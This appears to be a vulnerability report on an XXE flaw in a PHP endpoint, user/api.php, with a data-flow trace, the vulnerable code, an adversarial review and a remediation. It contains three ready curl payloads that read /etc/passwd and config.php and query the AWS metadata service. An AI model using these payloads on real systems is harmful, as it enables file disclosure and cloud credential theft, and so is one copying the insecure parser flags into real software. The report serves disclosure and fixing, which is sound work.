# Vulnerability: XML External Entity (XXE) — Local File Read and SSRF

## Summary
`user/api.php` parses raw user-supplied XML from the POST body with `LIBXML_NOENT` (entity substitution) and `LIBXML_DTDLOAD` (external DTD loading) enabled, while explicitly calling `libxml_disable_entity_loader(false)` to ensure entity loading is active. The parsed `<user>` element value is then reflected directly into the HTTP response via `echo`. An unauthenticated attacker can submit a crafted XML document containing an external entity declaration that references local files (e.g., `file:///etc/passwd`) or internal services (SSRF). The entity value is substituted into the `<user>` element and reflected in the response, enabling direct data exfiltration.

## Confidence
High

## Authentication Requirement
Unauthenticated

## Attack Surface Location
- **Endpoint:** `POST /user/api.php`
- **Handler:** `user/api.php:1-10`
- **Middleware / Guards:** None (AumWAF is NOT loaded — file does not include `init.php`)

## Attack Chain
1. **Initial access:** Attacker sends an HTTP POST request to `/user/api.php` with no authentication, session, or CSRF token.
2. **Endpoint interaction:** The request body is read via `file_get_contents('php://input')` — fully user-controlled, no content-type enforcement.
3. **Malicious input:** The attacker supplies an XML document with a `<!DOCTYPE>` containing an external entity declaration pointing to a local file or internal URL.
4. **Sink execution:** `DOMDocument::loadXML()` is called with `LIBXML_NOENT | LIBXML_DTDLOAD`, causing the XML parser to resolve the external entity and substitute its value into the document tree.
5. **Post-exploitation:** `simplexml_import_dom()` extracts the `<user>` element, which now contains the exfiltrated file contents or SSRF response.
6. **Final impact:** `echo "You have logged in as user $user"` reflects the stolen data in the HTTP response. Local file disclosure (credentials, source code), SSRF against internal/cloud-metadata services.

## Data Flow
- **Source (user input):** `php://input` raw POST body → `$xmlfile`
- **Sink:** `DOMDocument::loadXML()` at `user/api.php:5`

```
file_get_contents('php://input') [user/api.php:3] → $xmlfile → DOMDocument::loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD) [user/api.php:5] → simplexml_import_dom($dom) [user/api.php:6] → $creds->user [user/api.php:7] → echo "... $user ..." [user/api.php:10]
```

## Proof of Concept

### Prerequisites
- Target server running PHP < 8.0 (where `libxml_disable_entity_loader` is functional)
- Network access to `POST /user/api.php`

### Exploit 1: Local File Read (`/etc/passwd`)
```bash
curl -s -X POST http://{{TARGET_HOST}}/user/api.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<creds>
  <user>&xxe;</user>
  <pass>test</pass>
</creds>'
```

**Expected Vulnerable Response:**
```
Not Implented yet<br />
You have logged in as user root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...<br />
```

### Exploit 2: Application Source Code Disclosure
```bash
curl -s -X POST http://{{TARGET_HOST}}/user/api.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<creds>
  <user>&xxe;</user>
  <pass>test</pass>
</creds>'
```

### Exploit 3: SSRF Against Cloud Metadata (AWS)
```bash
curl -s -X POST http://{{TARGET_HOST}}/user/api.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<creds>
  <user>&xxe;</user>
  <pass>test</pass>
</creds>'
```

### Expected Patched Response
```
Not Implented yet<br />
You have logged in as user &xxe;<br />
```
(or an XML parse error, depending on the fix applied)

### Impact Demonstration
- **Exploit 1** proves arbitrary local file read — attacker can retrieve `/etc/shadow`, SSH keys, application secrets.
- **Exploit 2** proves source code disclosure — attacker can read `config.php` to obtain database credentials.
- **Exploit 3** proves SSRF — in cloud environments, attacker can steal IAM credentials from the metadata service.

## Affected Code
```php
// user/api.php:1-10
<?php 
libxml_disable_entity_loader(false);                           // explicitly enables entity loading
$xmlfile = file_get_contents('php://input');                    // unauthenticated user input
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);        // XXE sink
$creds = simplexml_import_dom($dom);
$user = $creds->user;
$pass = $creds->pass;
echo "Not Implented yet<br />\n";
echo "You have logged in as user $user<br />\n";                // reflected output
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** The endpoint does NOT include `init.php`, so AumWAF is not applied. There is no authentication check. The endpoint is directly reachable by any unauthenticated HTTP client.
- **Impact attack — FAILED to kill.** Local file read (`file:///etc/passwd`, `file:///var/www/html/config.php`) discloses OS credentials, application secrets, and database passwords. SSRF (`http://169.254.169.254/`) targets cloud metadata endpoints. All impacts are in-scope.
- **Validity attack — FAILED to kill.** No input validation, no XML schema validation, no allowlist. The code explicitly calls `libxml_disable_entity_loader(false)` and sets both `LIBXML_NOENT` and `LIBXML_DTDLOAD` flags. No framework protection exists.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Disable external entity loading and remove dangerous flags:
```php
libxml_disable_entity_loader(true);  // or remove entirely for PHP 8.0+
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NONET);  // remove LIBXML_NOENT and LIBXML_DTDLOAD
```
Or better, use a safe XML parser that does not support external entities.